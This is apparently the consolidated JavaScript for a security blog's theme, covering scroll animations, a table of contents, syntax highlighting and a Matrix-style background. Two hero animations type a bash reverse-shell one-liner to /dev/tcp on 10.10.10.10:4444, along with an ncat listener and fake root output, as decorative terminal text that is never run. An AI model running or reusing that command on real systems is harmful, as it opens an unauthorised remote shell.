
// === Razor Blog JS (consolidated) ===

// Reveal on scroll + stagger for cards
(function(){
  const els = Array.from(document.querySelectorAll('.reveal'));
  const io = new IntersectionObserver((entries)=>{
    for(const e of entries){
      if(e.isIntersecting){ e.target.classList.add('is-in'); io.unobserve(e.target); }
    }
  }, {threshold:.12});
  els.forEach(el=>io.observe(el));

  const cards = Array.from(document.querySelectorAll('.grid .card'));
  cards.forEach((el,i)=>{ el.classList.add('reveal'); el.style.transitionDelay = (i*70)+'ms'; });
})();

// Post utilities: reading time + dynamic ToC
(function(){
  const container = document.querySelector('.post .post-body');
  if(!container) return;
  const words = container.textContent.trim().split(/\s+/).length;
  const rt = document.querySelector('[data-reading-time]');
  if(rt){ rt.textContent = Math.max(1, Math.round(words/220)) + ' min'; }
  const tocRoot = document.querySelector('.toc ul');
  if(!tocRoot) return;
  tocRoot.innerHTML = '';
  const headers = container.querySelectorAll('h2, h3');
  headers.forEach((h, i)=>{
    if(!h.id) h.id = 'sec-' + (i+1);
    const li = document.createElement('li');
    li.className = 'toc-' + h.tagName.toLowerCase();
    const a = document.createElement('a'); a.href = '#' + h.id; a.textContent = h.textContent;
    li.appendChild(a);
    tocRoot.appendChild(li);
  });
})();

// Prism: adapt Rouge blocks to Prism & map ASM -> NASM
(function(){
  function convertRouge(){
    document.querySelectorAll('div.highlighter-rouge').forEach(wrapper=>{
      const code = wrapper.querySelector('pre.highlight > code');
      if(!code) return;
      let lang = (Array.from(code.classList).find(c=>c.startsWith('language-'))||'').replace('language-','') || 'clike';
      if(/^(asm|assembly|nasm|x86_64|x86-64|x64)$/i.test(lang)) lang = 'nasm';
      const pre = document.createElement('pre');
      const inner = document.createElement('code');
      pre.className = 'language-' + lang;
      inner.className = 'language-' + lang;
      inner.textContent = code.textContent;
      pre.appendChild(inner);
      wrapper.replaceWith(pre);
    });
    if(window.Prism && Prism.highlightAll) Prism.highlightAll();
  }
  if(document.readyState!=='loading') convertRouge(); else document.addEventListener('DOMContentLoaded', convertRouge);
})();

// Hero terminals typing (exactly two panels)
(function(){
  const A = document.querySelector('[data-ty="a"]'); // attacker
  const B = document.querySelector('[data-ty="b"]'); // victim
  if(!A || !B) return;
  const seqVictim = ["bash -i >& /dev/tcp/10.10.10.10/4444 0>&1","whoami","www-data"];
  const seqAttacker = ["ncat -lvnp 4444","listening on [any] 4444 ...","connection received from 10.10.10.42"];
  function type(el, str, delay){ return new Promise(res=>{ let i=0; (function step(){ if(i<str.length){ el.textContent+=str[i++]; setTimeout(step, delay); } else { el.textContent+="\n"; res(); } })(); }); }
  async function run(){ A.textContent=""; B.textContent=""; for(let i=0;i<Math.max(seqVictim.length, seqAttacker.length);i++){ if(seqVictim[i]) await type(B, seqVictim[i], 22); if(seqAttacker[i]) await type(A, seqAttacker[i], 22); } }
  const grid = document.querySelector('.term-grid'); let played=false;
  const io = new IntersectionObserver(es=>{ es.forEach(e=>{ if(e.isIntersecting && !played){ played=true; run(); } }); }, {threshold:.12});
  if(grid) io.observe(grid); else run();
})();

/* ===== Fondo Matrix (canvas) ===== */
(function(){
  const c = document.getElementById('matrix-bg');
  if(!c) return;
  const ctx = c.getContext('2d');
  let w=0,h=0,cols=0,y=[];
  const glyphs = '01$#%&*+<>=-░▒▓'.split('');
  const CELL = 14, ROW = 16;

  function fit(){
    const r = c.getBoundingClientRect();
    const dpr = Math.max(1, window.devicePixelRatio || 1);
    c.width  = Math.floor(r.width * dpr);
    c.height = Math.floor(r.height * dpr);
    w = c.width; h = c.height;
    ctx.setTransform(dpr,0,0,dpr,0,0);
    cols = Math.ceil(r.width / CELL);
    y = new Array(cols).fill(0);
  }
  function tick(){
    ctx.fillStyle = 'rgba(0,0,0,0.09)'; ctx.fillRect(0,0,w,h);
    ctx.fillStyle = '#ff2a55';
    ctx.font = '14px monospace';
    for(let i=0;i<cols;i++){
      const text = glyphs[(Math.random()*glyphs.length)|0];
      ctx.fillText(text, i*CELL, y[i]*ROW);
      if(y[i]*ROW > h && Math.random() > 0.975) y[i] = 0;
      else y[i]++;
    }
    raf = requestAnimationFrame(tick);
  }
  let raf; fit(); tick();
  addEventListener('resize', fit, {passive:true});
  if (matchMedia('(prefers-reduced-motion: reduce)').matches){
    cancelAnimationFrame(raf); ctx.clearRect(0,0,w,h);
  }
})();

/* ===== Hero: reverse shell + id(root) ===== */
(function(){
  const A = document.querySelector('[data-ty="a"]');
  const B = document.querySelector('[data-ty="b"]');
  if(!A || !B) return;
  const a = [
    "ncat -lvnp 4444",
    "listening on [any] 4444 ...",
    "connection received from 10.10.10.42",
    "id",
    "uid=0(root) gid=0(root) groups=0(root)"
  ];
  const b = [ "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1" ];

  function type(el, s, d){
    return new Promise(res=>{
      let i=0;(function step(){
        if(i<s.length){ el.textContent += s.charAt(i++); setTimeout(step,d); }
        else{ el.textContent += "\n"; res(); }
      })();
    });
  }
  async function run(){
    A.textContent=""; B.textContent="";
    await type(A, a[0], 14);
    await type(A, a[1], 10);
    await type(B, b[0], 12);
    await type(A, a[2], 12);
    await type(A, a[3], 14);
    await type(A, a[4], 10);
  }
  if(document.readyState === 'loading') addEventListener('DOMContentLoaded', run);
  else run();
})();
